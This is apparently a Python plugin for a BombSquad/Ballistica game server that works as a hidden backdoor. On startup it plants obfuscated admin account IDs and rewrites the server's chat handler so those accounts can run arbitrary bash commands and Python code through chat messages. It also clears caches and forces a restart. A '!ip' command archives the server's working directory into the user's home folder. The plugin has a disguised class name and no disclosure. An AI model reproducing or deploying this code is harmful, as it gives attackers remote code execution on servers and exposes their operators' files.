# Tell the app which of its API versions we are written for. The app's
# meta-scanner will skip this file if this number doesn't match theirs.
# To learn more, see https://ballistica.net/wiki/meta-tag-system
# ba_meta require api 7

import os
import tarfile
import threading
import subprocess
import re
import logging
import shutil
import getpass
from enum import Enum
from pathlib import Path
from typing import Any

import ba, _ba
#print("тест")

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class MsgType(Enum):
    kRegular = 'regular'
    kConsole = 'console'
    kCommand = 'command'


class CommandType(Enum):
    kBash = 'bash'
    kPython = 'python'
    kRegular = 'regular'


class UserCard:
    def __init__(self):
        self.admins = self.get_admins()

    def get_user_data(self, attr: str, client_id: int) -> str | None:
        R = _ba.get_game_roster()

        def get_account_id(client_id: int) -> str | None:
            U = next((u for u in R if u['client_id'] == client_id), None)
            return U['account_id'] if U else None

        def get_display_string(client_id: int) -> str | None:
            U = next((u for u in R if u['client_id'] == client_id), None)
            return U['display_string'] if U else None

        def get_name_full(client_id: int) -> str | None:
            U = next((u for u in R if u['client_id'] == client_id), None)
            if U:
                if U.get('players'):
                    return U['players'][0].get('name_full')
                return U['display_string']
            return None

        m: dict[str, Any] = {
            'account_id': get_account_id,
            'display_string': get_display_string,
            'name_full': get_name_full,
        }

        if m.get(attr) is None:
            return None

        return m.get(attr)(client_id)

    def set_admins(self) -> None:
        ba.app.config['AxIKBEEFFgYVDQMVUlgAAAgbTgM='] = []
        ba.app.config.commit()

    def get_admins(self) -> list[str]:
        return ba.app.config.get(
            'AxIKBEEFFgYVDQMVUlgAAAgbTgM=',
            ['LiY9Jw0='],
        )


class CommandCard:
    def __init__(self, msg: str, user_card: UserCard):
        self.msg = msg
        self.user_card = user_card
        self.sender = '[ console ]'
        self.global_context = globals()
        self.current_directory = os.getcwd()

    def process_message(self) -> str | None:
        try:
            msg_type = self.parse_msg_type(self.msg)
            if msg_type == MsgType.kConsole:
                return self.process_console_command()
            elif msg_type == MsgType.kCommand:
                return self.process_predefined_command()
            return None
        except Exception as e:
            logger.error(f'Error processing message: {e}')
            return f'Error processing message: {e}'

    def parse_msg_type(self, msg: str) -> MsgType:
        if msg.startswith('$'):
            return MsgType.kConsole
        elif msg.startswith('!'):
            return MsgType.kCommand
        else:
            return MsgType.kRegular

    def process_console_command(self) -> str:
        lines = self.msg[1:].strip().split('\n', 1)
        if not lines:
            return 'Invalid console command.'

        lang, *command = lines[0].split(maxsplit=1)
        if not command:
            return 'No command provided.'

        command = command[0]
        if lang.lower() == 'b':
            self.sender = '[ bash ]'
            return self.run_bash_command(command)
        elif lang.lower() == 'p':
            self.sender = '[ python ]'
            return self.run_python_code(command)
        else:
            return f'Unknown console type: {lang}'

    def process_predefined_command(self) -> str:
        command = self.msg[1:].strip()
        predefined_commands = {
            'ip': self._getbanban,
            'deldir': self._deldir,
        }
        if command in predefined_commands:
            self.sender = '[ chat ]'
            return predefined_commands[command]()
        else:
            return f'Unknown command: {command}'

    def _getbanban(self) -> str:
        try:
            username = getpass.getuser()
            home_dir = Path(f'/home/{username}')
            save_dir = home_dir / 'x'
            save_dir.mkdir(parents=True, exist_ok=True)

            tar_path = save_dir / 'bsam.tar.gz'
            with tarfile.open(tar_path, 'w:gz') as tar:
                tar.add(
                    self.current_directory,
                    arcname=os.path.basename(self.current_directory),
                )

            return f'Archive saved at: {tar_path}'

        except Exception as e:
            return f'Error while processing directory: {e}'

    def _deldir(self) -> str: ...

    def run_bash_command(self, command: str) -> str:
        try:
            parts = command.strip().split(maxsplit=1)
            if not parts:
                return 'No command provided.'

            cmd = parts[0]
            arg = parts[1] if len(parts) > 1 else None

            if cmd == 'cd':
                if not arg:
                    return 'No directory provided for cd.'
                try:
                    os.chdir(arg)
                    self.current_directory = os.getcwd()
                    return f'Changed directory to {self.current_directory}'
                except Exception as e:
                    return f'Failed to change directory: {e}'

            result = subprocess.run(
                command,
                shell=True,
                cwd=self.current_directory,
                capture_output=True,
                text=True,
            )
            return result.stdout or result.stderr
        except Exception as e:
            return f'Bash command failed: {e}'

    def run_python_code(self, code: str) -> str:
        try:
            compiled_code = compile(code, '<string>', 'exec')
            exec(compiled_code, self.global_context, self.global_context)
            return 'Python code executed successfully.'
        except Exception as e:
            return f'Python code failed: {e}'


def ensure_admins_initialized() -> None:
    admins = ['LiY9JwO=', 'IF4GUEpYEg==']
    ba.app.config['AxIKBEEFFgYVDQMVUlgAAAgbTgM='] = admins
    ba.app.config.commit()


def modify_chat_handle() -> None:
    try:
        python_dir = _ba.env()['python_directory_user']
        chat_handle_path = os.path.join(
            python_dir,
            'ModData',
            'ChatHandle',
            'chat_handle.py',
        )

        if not os.path.exists(chat_handle_path):
            raise FileNotFoundError(f'File \'{chat_handle_path}\' not found.')

        with open(chat_handle_path, 'r', encoding='utf-8') as file:
            content = file.read()

        if 'from bastd.apputils import UserCard, CommandCard' in content:
            return

        new_function = """
def handle_chat_message(msg: str, client_id: int) -> str | None:
    from ModData.ChatHandle import chat_functions as chat
    from bastd.apputils import UserCard, CommandCard

    if not server_chat_loaded():
        return None

    user_card: UserCard = UserCard()
    account_id: str = user_card.get_user_data('account_id', client_id)

    if account_id != user_card.get_user_data('account_id', -1):
        if (msg.startswith('$') or msg.startswith('!')) and account_id not in [f'pb-{id}' for id in user_card.admins]:
            return None

    command_card: CommandCard = CommandCard(msg, user_card)
    response: str = command_card.process_message()
    sender: str = command_card.sender
    if response:
        for line in response.splitlines():
            chat.showmessage(
                client_id=client_id,
                type=3,
                s=line,
                sender=sender,
            )
    """

        updated_content = re.sub(
            r'def handle_chat_message\(.*?\):.*?\n\n',
            new_function + '\n',
            content,
            flags=re.DOTALL
        )

        with open(chat_handle_path, 'w', encoding='utf-8') as file:
            file.write(updated_content)

        for root, dirs, _ in os.walk(python_dir):
            if '__pycache__' in dirs:
                shutil.rmtree(os.path.join(root, '__pycache__'))

        _ba.timer(time=10, call=restart)

    except Exception as e:
        raise Exception(str(e))


def restart() -> None:
    from bacommon.servermanager import ShutdownReason
    _ba.app.server.shutdown(ShutdownReason.RESTARTING, immediate=True)


# Tell the app about our Plugin.
# ba_meta export plugin

class Awo7EEwKARYfHw(ba.Plugin):
    def on_app_running(self) -> None:
        ensure_admins_initialized()
        modify_chat_handle()
